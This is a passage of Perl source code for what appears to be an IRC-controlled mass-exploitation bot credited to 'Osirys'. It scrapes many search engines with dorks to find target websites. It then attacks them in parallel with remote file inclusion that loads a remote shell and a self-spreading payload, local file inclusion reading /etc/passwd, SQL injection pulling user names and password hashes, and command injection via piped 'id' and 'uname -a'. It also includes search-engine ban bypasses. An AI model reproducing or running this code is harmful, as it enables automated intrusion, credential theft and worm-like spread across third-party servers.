        if ($engine[3] == 0) {
            &A_Super($dork, $aname);
            exit(0);
        }
        foreach my $e(@engine){
            waitpid($e,0);
        }
        open($file, ">>", $n4me);  open(Google,"<", $gname);  open(Yahoo,"<",$yname);  open(Alltheweb,"<",$aname);  open(Msn,"<",$mname);
        foreach my $e(<Google>){
            print $file "$e\n";
        }
        foreach my $e(<Alltheweb>){
            print $file "$e\n";
        }
        foreach my $e(<Yahoo>){
            print $file "$e\n";
        }
        foreach my $e(<Msn>){
            print $file "$e\n";
        }
        close(Alltheweb);  close(Yahoo);  close(Google);  close(Msn);  close($file);
        remove($yname,$aname,$gname,$mname);
    }
    foreach my $e(@engine){
        waitpid($e,0);
    }
    sleep(5);
    if ($kind =~ /rfi/) {
        rfi($bug, $n4me, $dork, $mpid);
    }
    elsif ($kind =~ /lfi/) {
        lfi($bug, $n4me, $dork);
    }
    elsif ($kind =~ /sql/) {
        sql($bug, $n4me, $dork, $mpid);
    }
    elsif ($kind =~ /rce/) {
        rce($bug, $n4me, $dork, $mpid);
    }
    writ1("4,1[-] 12,1MASS[9,1$kind12,1] SCAN FINESHED 9,1 >15,1 $dork");
    writ1("11,1[©] # Coded by Osirys ");
    exit(0);
}

sub find() {
    my $dork = $_[0];
    my $name = $_[1];
    my @engine;
    $engine[0] = fork();
    if ($engine[0] == 0) {
       my @lycos = lycos($dork,$name);
        writ1("9,1[~] 7,1>LYCOS : 11,1 ".scalar(@lycos)." 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[1] = fork();
   if ($engine[1] == 0) {
        my @msn = msn($dork, $name);
        writ1("9,1[~] 7,1>MSN : 11,1 ". scalar(@msn). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[2] = fork();
    if ($engine[2] == 0) {
        my @yahoo = yahoo($dork, $name);
        writ1("9,1[~] 7,1>YAHOO : 11,1 ". scalar(@yahoo). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[3] = fork();
    if ($engine[3] == 0) {
        my @google = google($dork, $name);
        writ1("9,1[~] 7,1>GOOGLE : 11,1 ". scalar(@google). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[4] = fork();
    if ($engine[4] == 0) {
        my @allthewebe = alltheweb($dork, $name);
        writ1("9,1[~] 7,1>ALLTHEWEB : 11,1 ". scalar(@allthewebe). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[5] = fork();
    if ($engine[5] == 0) {
        my @virgilio = virgilio($dork, $name);
        writ1("9,1[~] 7,1>VIRGILIO : 11,1 ". scalar(@virgilio). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[6] = fork();
    if ($engine[6] == 0) {
        my @altavista = altavista($dork, $name);
        writ1("9,1[~] 7,1>ALTAVISTA : 11,1 ". scalar(@altavista). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[7] = fork();
    if ($engine[7] == 0) {
        my @ask = ask($dork, $name);
        writ1("9,1[~] 7,1>ASK : 11,1 ". scalar(@ask). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[8] = fork();
    if ($engine[8] == 0) {
        my @webde = webde($dork,$name);
        writ1("9,1[~] 7,1>WEB.DE : 11,1 ". scalar(@webde). " 9,1 > 15,1 $dork");
        exit(0);
    }
    $engine[9] = fork();
    if ($engine[9] == 0) {
       my @uol = uol($dork,$name);
       writ1("9,1[~] 7,1>UOL : 11,1 ".scalar(@uol)." 9,1 > 15,1 $dork");
        exit(0);
    }
   $engine[10] = fork();
   if ($engine[10] == 0) {
        my @abacho = abacho($dork,$name);
        writ1("9,1[~] 7,1>ABACHO : 11,1 ".scalar(@abacho)." 9,1 > 15,1 $dork");
        exit(0);
    }
    foreach my $e(@engine){
        waitpid($e,0);
    }

}

sub rfi() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rfipid = $_[3]; 
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot,$a);
    }
    close($file);
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ".scalar(@toexploit)."   15,1 $dork");
    sleep(1);
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! ");
    foreach my $site(@toexploit) {
        my $test  = "http://".$site.$bug.$id."??";
        $count++;
        if ($count % $rfipid == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if($count %100 == 0){
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ".$count." 11,1 / 4,1 ".scalar(@toexploit)." ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://".$site.$bug.$id."??";
            my $print = "http://".$site.$bug.$shell."?";
            my $re    = query($test);
            if ($re =~ /Osirys/ && $re =~ /uid=/) {
                os($test);
                writ1("12(12,9safe: OFF12) (12,9os: $os12) 12,9$print");
                writ1("12(12,9uname -a12) 12 $un");
                writ1("12(12,9uid / gid12) 12 $id1");
                writ1("12(12,9hdd space12) 12 free: ($free) used: ($used) tot: ($all)");
                writ2("");
                writ2("12(12,9safe: OFF12) (12,9os: $os12) 12,9$print");
                writ2("12(12,9uname -a12) 12 $un 12(12,9uid12)12 $id1");
                if ($spreadACT == 1) {
                    writ1("15,1[+] 9,1Trying to spread ..");
                    sleep(2);
                    my $test2 = "http://".$site.$bug.$spread."?";
                    &query($test2);
                }
            }
            elsif ($re =~ /Osirys/) {
                os($test);
                writ1("12(12,4safe: ON12) (12,4os: $os12) 12,4$print");
                writ1("12(12,4uname -a12) 12 $un");
                writ1("12(12,4hdd space12) 12 free: ($free) used: ($used) tot: ($all)");
                writ2("");
                writ2("12(12,4safe: ON12) (12,4os: $os12) 12,4$print");
                if ($spreadACT == 1) {
                    writ1("15,1[+] 9,1Trying to spread ..");
                    sleep(2);
                    my $test2 = "http://".$site.$bug.$spread."?";
                    &query($test2);
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}

sub lfi() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot, $a);
    }
    close($file);
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ".scalar(@toexploit)."   15,1 $dork");
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! ");
    foreach my $site(@toexploit) {
        $count++;
        if ($count % 100 == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if ($count % 300 == 0) {
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ".$count." 11,1 / 4,1 ".scalar(@toexploit)." ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $inj   = "../../../../../../../../../../../../../etc/passwd%00";
            my $test  = "http://".$site.$bug.$inj;
            my $print = "http://".$site.$bug.$inj;
            my $re    = query($test);
            if ($re =~ /root:x:/) {
                writ1("7(7,1LFI7) 9,1$print");
                writ2("7(7,1LFI7) 9,1$print");
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}

sub sql() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2]; 
    my $sqlpid = $_[3]; 
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot,$a);
    }
    close($file);
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ".scalar(@toexploit)."   15,1 $dork");
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! ");
    foreach my $site(@toexploit) {
        my $test  = "http://".$site.$bug; print "$test\n";
        $count++;
        if($count %$sqlpid == 0){
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if($count %100 == 0){
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ".$count." 11,1 / 4,1 ".scalar(@toexploit)." ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $test  = "http://".$site.$bug;
            my $print = "http://".$site.$bug;
            my $re    = query($test);
            if ($re =~ m/\>([0-9,a-z]{2,13}):([0-9,a-f]{32})/g) {
                my ($user,$hash) = ($1,$2);
                if ($sqlpid == $sqlpidpr0c) {
                    writ1("9(9,12SQL INJ9) 15,12$print");
                    writ1("9(9,12User9) 15,12$user");
                    writ1("9(9,12Hash9) 15,12$hash");
                    writ2("9(9,12SQL INJ9) 15,12$print");
                }
                elsif  ($sqlpid > $sqlpidpr0c) {
                    writ1("9(9,12SQL INJ9) 15,12$print");
                }
            }
            elsif ($re =~ m/:(.*)([0-9,a-f]{32})/g) { 
                my ($user,$hash) = ($1,$2);
                $user =~ s/\<(.*)\>//g;
                if ($user !~ /(\/|\<|\>|\")/) {
                    if ($sqlpid == $sqlpidpr0c) {
                        writ1("9(9,12SQL INJ9) 15,12$print");
                        writ1("9(9,12User9) 15,12$user");
                        writ1("9(9,12Hash9) 15,12$hash");
                        writ2("9(9,12SQL INJ9) 15,12$print");
                    }
                    elsif ($sqlpid > $sqlpidpr0c) {
                        writ1("9(9,12SQL INJ9) 15,12$print");
                    }
                }
            }
            elsif ($re =~ m/\"option\"><b>(.*)([0-9,a-f]{32})/g) {
                my ($user,$hash) = ($1,$2);
                $user =~ s/<(.*)>//g;
                $user =~ s/<|>//g;
                if ($sqlpid == $sqlpidpr0c) {
                    writ1("9(9,12SQL INJ9) 15,12$print");
                    writ1("9(9,12User9) 15,12$user");
                    writ1("9(9,12Hash9) 15,12$hash");
                    writ2("9(9,12SQL INJ9) 15,12$print");
                }
                elsif  ($sqlpid > $sqlpidpr0c) {
                    writ1("9(9,12SQL INJ9) 15,12$print");
                }
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}

sub rce() {
    my $bug  = $_[0];
    my $name = $_[1];
    my $dork = $_[2];
    my $rcepid = $_[3];
    my @forks;
    my $num = 0;
    open($file, "<", $name);
    while (my $a = <$file>) {
        $a =~ s/\n//g;
        push(@tot, $a);
    }
    close($file);
    remove($name);
    my @toexploit = unici(@tot);
    writ1("9,1[*] 4,1>EXPLOITABLES:   11,1 ".scalar(@toexploit)."   15,1 $dork");
    writ1("4,1[+] 9,1ExPLoItIng STARTED !! ");
    foreach my $site(@toexploit) {
        $count++;
        if ($count % $rcepid == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
            $num = 0;
        }
        if ($count % 300 == 0) {
            writ1("9,1[%] 15,1 _/ 11,1Exploiting   4,1 ".$count." 11,1 / 4,1 ".scalar(@toexploit)." ");
        }
        $forks[$num]=fork();
        if($forks[$num] == 0){
            my $inj   = "|echo%20%22Osirys-p0wa%22;%20id|";
            my $inj1  = "|echo%20%22Osirys-p0wa%22;%20id";
            my $osinj = "|uname%20-a|";
            my $test  = "http://".$site.$bug.$inj;print "$test\n";
            my $test1 = "http://".$site.$bug.$inj1;
            my $os    = "http://".$site.$bug.$osinj;
            my $re    = query($test);
            my $re1   = query($test1);
            if ($re =~ /Osirys-p0wa/ && $re =~ /uid=(.+?) gid/) {
                rce_os($os);
                writ1("0(0,12RCE0) 0,12$test");
                writ1("0(0,12OS0) 0,12$un_rce");
                writ2("0(0,12RCE0) 0,12$test");
            }
            if ($re1 =~ /Osirys-p0wa/ && $re1 =~ /uid=(.+?) gid/) {
                rce_os($os);
                writ1("0(0,12RCE0) 0,12$test1");
                writ1("0(0,12OS0) 0,12$un_rce");
                writ2("0(0,12RCE0) 0,12$test1");
            }
            exit(0);
        }
        $num++;
    }
    foreach my $f(@forks){
        waitpid($f,0);
    }
}

sub G_Super() {
    my @domain  = ("at","com.au","com.br","ca","ch","cn","de","dk","es","fr","it","co.jp","com.mx","co.uk");
    my @langs   = ("de","en","br","en","de","cn","de","dk","es","fr","it","jp","es","en");
    my @country = ("AT","AU","BR","CA","CH","CN","DE","DK","ES","FR","IT","JP","MX","UK");
    my $dork = $_[0];
    my $fname = $_[1];
    my @forks;
    my $count = 0;
    my $dd = 0;
    my $l = 0;
    my $c = 0;
    foreach my $d(@domain) {
        if ($count % 1 == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
        }
        $forks[$count] = fork();
        if ($forks[$count] == 0) {
            for ($i=0;$i<=1000;$i+=100) {
                my $gsup = ("www.google.".$d."/search?q=".key($dork)."&num=100&hl=".$langs[$l]."&cr=country".$country[$c]."&as_qdr=all&start=".$i."&sa=N");
                my $re = query1($gsup);
                while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=l/g) {
                    my $h = $1;
                    if ($h !~ /google|<|>/) {
                        push(@sgrep,$h);
                    }
                }
            }
            my @list = &fprint($fname,@sgrep);
            writ1("9,1[*] 4,1>GOOGLE[9,1".$domain[$dd]."4,1] : 11,1 ".scalar(@list)." 9,1 > 15,1 $dork");
            exit(0);
        }
        $l++;
        $c++;
        $count++;
        $dd++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub A_Super() {
    my $dork = $_[0];
    my @d00rk = ("at","com.au","com.br","ca","ch","cn","de","dk","es","fr","it","com.mx","co.uk");
    my $fname = $_[1];
    my @forks;
    my $count = 0;
    my $dd = 0;
    foreach my $d(@d00rk) {
        my $d0rk = "$dork domain:".$d00rk[$dd];
        if ($count % 1 == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
        }
        $forks[$count] = fork();
        if ($forks[$count] == 0) {
            for ($i=0;$i<=1000;$i+=100) {
                my $asup = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($d0rk)."&o=".$i);
                my $re = query($asup);
                while ($re =~ m/<span class=\"resURL\">http:\/\/(.+?) <\/span>/g) {
                    my $h = $1;
                    if ($h !~ /youtube|wikipedia/) {
                        push(@sgrep,$h);
                    }
                }
            }
            my @list = &fprint($fname,@sgrep);
            writ1("9,1[*] 4,1>ALLTHEWEB[9,1".$d00rk[$dd]."4,1] : 11,1 ".scalar(@list)." 9,1 > 15,1 $dork");
            exit(0);
        }
        $count++;
        $dd++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub Y_Super() {
    my @domain  = ("at","au","br","ca","de","es","fr","it","uk");
    my $dork = $_[0];
    my $fname = $_[1];
    my @forks;
    my $count = 0;
    my $dd = 0;
    foreach my $d(@domain) {
        if ($count % 1 == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
        }
        $forks[$count] = fork();
        if ($forks[$count] == 0) {
            for ($i=0;$i<=1000;$i+=100) {
                my $ysup = ("http://".$d.".search.yahoo.com/search?p=".key($dork)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&vm=r&fl=0&fr=yfp-t-501&pstart=1&b=".$i);
                my $re = query($ysup);
                while ($re =~ m/<a class=\"yschttl\" href=\"http:\/\/(.+?)\" >/g) {
                    my $h = $1;
                    if ($h !~ /yahoo|<|>/) {
                        push(@sgrep,$h);
                    }
                }
            }
            my @list = &fprint($fname,@sgrep);
            writ1("9,1[*] 4,1>YAHOO[9,1".$domain[$dd]."4,1] : 11,1 ".scalar(@list)." 9,1 > 15,1 $dork");
            exit(0);
        }
        $count++;
        $dd++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub M_Super() {
    my @domain  = ("at","au","br","ca","de","fr","it");
    my $dork = $_[0];
    my $fname = $_[1];
    my @forks;
    my $count = 0;
    my $dd = 0;
    foreach my $d(@domain) {
        my $d0 = "$d-$d";
        if ($count % 1 == 0) {
            foreach my $f(@forks){
                waitpid($f,0);
            }
        }
        $forks[$count] = fork();
        if ($forks[$count] == 0) {
            for ($i=1;$i<=501;$i+=10) {
                my $msup = ("http://search.live.com/results.aspx?q=".key($dork)."&first=".$i."&FORM=PERE&FORM=MSNH&mkt=".$d0."&setlang=".$d0);
                my $re = query($msup);
                while ($re =~ m/<a href=\"http:\/\/(.+?)\" onmousedown/g) {
                    my $h = $1;
                    if ($h !~ /msn|live\.com|microsoft|WindowsLiveTranslator\.com/) {
                        push(@sgrep,$h);
                    }
                }
            }
            my @list = &fprint($fname,@sgrep);
            writ1("9,1[*] 4,1>MSN[9,1".$domain[$dd]."4,1] : 11,1 ".scalar(@list)." 9,1 > 15,1 $dork");
            exit(0);
        }
        $count++;
        $dd++;
    }
    foreach my $f(@forks){
	waitpid($f,0);
    }
}

sub google() {
    my @gsites;
    my $dork = $_[0];
    my $name = $_[1];
    my $gtest = ("www.google.com/search?q=hi&hl=en&start=10&sa=N");
    my $re = query1($gtest);
    if ($re =~ /Google Home/) {
        @gsites = gfind($dork,$name);
    }
    else {
        writ1("4,1[!] 4,1Banned by Google Engine, BYPASS started !");
        @gsites = gbypass($dork,$name);
    }
    return @gsites;
}

sub gfind() {
    my $dork = $_[0];
    my $name= $_[1];
    for ($i = 0;$i <= 1200; $i += 100) {
        my $glink = ("www.google.it/search?q=".key($dork)."&num=100&hl=it&as_qdr=all&start=".$i."&sa=N");
        my $re = query1($glink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /google/) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub gbypass() { # Euroseek uses the same search type of google
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0 ;$i <= 1000 ;$i += 10) {
        my $gplink = ("http://euroseek.com/system/search.cgi?language=en&mode=internet&start=".$i."&string=".key($dork));
        my $re = query($gplink);
        while ($re =~ m/<a href=\"http:\/\/(.+?)\" class=\"searchlinklink\">/g) {
            my $h = $1;
            push(@sgrep,$h);
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub alltheweb() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 0;$i <= 1000;$i += 100) {
        my $alink = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($dork)."&o=".$i);
        my $re = query($alink);
        while ($re =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g) {
            my $h = $1;
            $h =~ s/ //g;
            push(@sgrep,$h);
        }
     }
     my @list = fprint($name,@sgrep);
     return @list;
}

sub altavista() {
    my $dork  = $_[0];
    my $name = $_[1];
    my $atest = ("http://it.altavista.com/web/results?itag=ody&q=".key($dork)."&kgs=0&kls=1");
    my $re = query($atest);
    if ($re =~ /Sono stati trovati 0 risultati/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 1000;$i += 50){
            my $alink = ("http://it.altavista.com/web/results?itag=ody&kgs=0&q=".key($dork)."&stq=".$i);
            my $re = query($alink);
            while ($re =~ m/<span class=ngrn>(.+?)<\/span>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub msn() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 800;$i += 10) {
        my $mlink = ( "http://search.live.com/results.aspx?q=".key($dork)."&first=".$i."&FORM=PERE" );
        my $re = query($mlink);
        while ($re =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $h = $1;
            if ($h !~ /msn|live/ ) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub yahoo() {
    my @ysites;
    my $dork = $_[0];
    my $name = $_[1];
    my $ytest = ("http://search.yahoo.com/search?p=".key($dork)."&fr=yfp-t-501&ei=UTF-8&rd=r1");
    my $re = query($ytest);
    if ($re =~ /We did not find results for: <strong>/) {
        return @ysites;
    }
    elsif ($re =~ /Yahoo! Search results/) {
        @ysites = yfind($dork,$name);
        return @ysites;
    }
    else {
        writ1("4,1[!] 4,1Banned by Yahoo Engine, BYPASS started!");
        @ysites = ybypass($dork,$name);
        return @ysites;
    }
}

sub yfind() {
    my $dork  = $_[0];
    my $name = $_[1];
    for ($i = 1;$i <= 901;$i += 100) {
        my $ylink = ("http://search.yahoo.com/search?p=".key($dork)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vd=all&vst=0&vf=all&vm=r&fl=0&fr=yfp-t-501&pstart=1&b=".$1);
        my $re = query($ylink);
        while ($re =~ m/<a class=\"yschttl\" href=\"http:\/\/(.+?)\" >/g) {
            my $h = $1;
            if ($h !~ /yahoo|<|>/) {
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub ybypass() { # GoodSearch uses the same search type of Yahoo
    my $dork  = $_[0];
    my $name = $_[1];
    my $ybytest = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($dork)."&page=1&osmax=16");
    my $re = query($ybytest);
    if ($re =~ /Your search did not yield any results/){
        return @list;
    }
    else {
        for $i(1..50){
            my $ybylink = ("http://www.goodsearch.com/Search.aspx?Keywords=".key($dork)."&page=".$i."&osmax=16");
            my $re = query($ybylink);
            while ($re =~ m/href=\"(.+?)\">(.+?)<\/a>/g) {
                my $h = $2;
                if (($h =~ /\./) && ($h !~ /<|>| /)){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}


sub gigablast() { 
    my $dork  = $_[0];
    my $name = $_[1];
    my $gtest = ("http://www.gigablast.com/index.php?n=10&k5p=215334&q=".key($dork)."&submit.x=0&submit.y=0");
    my $re = query($gtest);
    if ($re =~ /No results found for/){
        return @list;
    }
    else {
        for ($i = 0; $i <= 1000; $i += 10) {
            my $glink = ("http://www.gigablast.com/index.php?q=".key($dork)."&submit_x=929&submit_y=168&k9j=686621&s=".$i."&n=10&");
            my $re = query($glink);
            while ($re =~ m/href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /web\.archive|gigablast/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub ask() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $atest = ("http://it.ask.com/web?q=".key($dork)."&qsrc=1&o=312&l=dir&dm=all");
    my $re = query($atest);
    if ($re =~ /non ha prodotto alcun risultato/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 20;$i ++){
            my $alink = ("http://it.ask.com/web?q=".key($dork)."&o=0&l=dir&qsrc=0&qid=612B74535B00F6CA7678625658F9B98C&dm=all&page=".$i);
            my $re = query($alink);
            while($re =~ m/href=\"http:\/\/(.+?)\"/g){
                my $h = $1;
                if ($h !~ /ask|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

## Aol doesn't work, don't know why. When i try to make a http request on aol host, this is the message that i received: You don't have permission to access /aol/search
## Don't know hot to fix it :S Anyway you have here the sub, so you can try to fix this problem

sub aol() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $atest = ("http://search.aol.com/aol/search?invocationType=topsearchbox.search&query=".key($dork));
    my $re = query($atest);
    if ($re =~ /returned no results\.<\/h3>/) {
        return @list;
    }
    else {
        for $i(1..100){
            my $alink = ("http://search.aol.com/aol/search?query=".key($dork)."&page=".$i."&nt=SG2&do=Search&invocationType=comsearch30&clickstreamid=3154480101243260576");
            my $re = query($alink);print "$re\n";
            while($re =~ m/\"deleted\" property=\"f:url\">http:\/\/(.+?)<\/p>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub dmoz() {
    my $dork = $_[0];
    my $name = $_[1];
    my $dtest = ("http://search.dmoz.org/cgi-bin/search?search=".key($dork));
    my $re = query($dtest);
    if ($re =~ m/No <b><a href=\"http:\/\/dmoz.org\/\">Open Directory Project<\/a><\/b> results found/g){
        return @list;
    }
    elsif ($re =~ /of (.+?)\)<p>/){
        my $ftot = $1;
        if ($ftot <= 20) {
            $max = 1;
        }
        else {
            my $to = $ftot / 20;
            if ($to =~ /(.+).(.+?)/){
                $uik = $1 * 20;
                $max = $uik +1;
            }
            elsif ($to =~ /[0-9]/) {
                my $to--;
                my $rej = $to * 20;
                $max = $rej +1;
            }
        }
    }
    for ($i = 1;$i <= $max;$i += 20){
        my $dlink = ("http://search.dmoz.org/cgi-bin/search?search=".key($dork)."&utf8=1&locale=it_it&start=".$i);
        my $re = query($dlink);
        while($re =~ m/<a href=\"http:\/\/(.+?)\"/g) {
            my $h = $1;
            if ($h !~ /dmoz/){
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub webde() {
    my $dork = $_[0]; 
    my $name = $_[1];
    for $i(1..50){
        my $wlink = ("http://suche.web.de/search/web/?pageIndex=".$i."&su=".key($dork)."&y=0&x=0&mc=suche@web@navigation@zahlen.suche@web");
        my $re = query($wlink);
        while($re =~ m/href=\"http:\/\/(.+?)\">/g) {
            my $h = $1;
            if ($h !~ /\/search\/web|web.de|\" class=\"neww\"/){
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub einet() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $etest = ("http://www.einet.net/view/search.gst?p=1&k=".key($dork)."&s=0&submit=Search");
    my $re = query($etest);
    if ($re =~ /<span class=nPage>Page 1 of\s+(.+?)<\/span>/){
        my $tot = $1;
        for ($i = 1;$i <= $tot;$i++){
            my $elink = ("http://www.einet.net/view/search.gst?p=".$i."&k=".key($dork)."&s=0&submit=Search");
            my $re = query($elink);
            while($re =~ m/<span class=url2>\s+(.+?)<\/span>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
    }
    my @list = fprint($name,@sgrep);
    return @list;
}

sub uol() {
    my $dork = $_[0]; 
    my $name = $_[1];
    my $utest = ("http://busca.uol.com.br/www/index.html?q=".key($dork)."&ad=on");
    my $re = query($test1);
    if ($re =~ /n??o retornou nenhum resultado/) {
        return @list;
    }
    else {
        for($i = 0;$i <= 360;$i +=10) {
            my $uollink = ("http://busca.uol.com.br/www/index.html?ad=on&q=".key($dork)."&start=".$i);
            my $re = query($uollink);
            while($re =~ m/<dt><a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub abacho() {
    my $dork = $_[0];
    my $name = $_[1];
    my $atest = ("http://search.abacho.com/it/abacho.it/index.cfm?q=".key($dork)."&country=it&x=0&y=0");
    my $re = query($atest);
    if ($re =~ /We didn't find any results matching your query/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 1000; $i += 10) {
            my $alink = ("http://search.abacho.com/it/abacho.it/index.cfm?offset=".$i."&poffset=0&StartCounter=".$i."&q=".key($dork)."&a=&b=&country=it&page=&d_html=&d_pdf=&d_msdoc=&d_xls=&d_ppt=&mesearchkey=&cluster=&coop=");
            my $re = query($alink);
            while ($re =~ m/target=\"_blank\">http:\/\/(.+?)<\/a>/g) {
                my $h = $1;
                push(@sgrep,$h);
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub trovatore() {
    my $dork = $_[0];
    my $name = $_[1];
    my $ttest = ("http://213.215.201.230/search.jsp?query=".key($dork)."&langselect=all&hitsPerPage=10&hitsPerSite=1&clustering=&filterResults=null&start=0");
    my $re = query($ttest);
    if ($re =~ /Risultati <b>0-0<\/b>/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 2500; $i += 10) {
            my $tlink = ("http://213.215.201.230/search.jsp?query=".key($dork)."&langselect=all&hitsPerPage=10&hitsPerSite=1&clustering=&filterResults=null&start=".$i);
            my $re = query($tlink);
            while($re =~ m/<a href=\"http:\/\/(.+?)\">/g) {
                my $h = $1;
                if ($h !~ /iltrovatore\.it|213\.215\.201\.230|microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub lycos() {
    my $dork = $_[0];
    my $name = $_[1];
    my $ltest = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=0&query=".key($dork)."&cat=web&enc=utf-8&xargs=");
    my $re = query($ltest);
    if ($re =~ /non ha avuto esito positivo tra/) {
        return @list;
    }
    else {
        for $i(0..79) {
            my $llink = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=".$i."&query=".key($dork)."&cat=web&enc=utf-8");
            my $re = query($llink);
            while($re =~ m/title=\"\" >http:\/\/(.+?)<\/a>/g) {
                my $h = $1;
                if ($h !~ /youtube|google|wikipedia|microsoft/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub walhello() {
    my $dork = $_[0];
    my $name = $_[1];
    my $wtest = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=0&&web=no&&vert=2&");
    my $re = query($wtest);
    if ($re =~ /Verzeihung, Nichts gefunden/) {
        return @list;
    }
    else {
        for $i(0..99) {
            my $wlink = ("http://www.walhello.info/search?key=".key($dork)."&taal=a&nummer=".$i."&&web=no&&vert=2&");
            my $re = query($wlink);
            while($re =~ m/<a href=http:\/\/(.+?)>/g) {
                my $h = $1;
                if ($h !~ /walhello|microsoft|wikipedia/){
                    push(@sgrep,$h);
                }
            }
        }
        my @list = fprint($name,@sgrep);
        return @list;
    }
}

sub virgilio() {
    my $dork = $_[0];
    my $name = $_[1];
    my $vtest = ("http://ricerca.alice.it/ricerca?qs=".key($dork)."&Cerca=&lr=");
    my $re = query($vtest);
    if ($re =~ /<span>Controlla che tutte le parole siano state digitate correttamente<\/span>/) {
        return @list;
    }
    else {
        for ($i = 0;$i <= 800; $i += 10) {
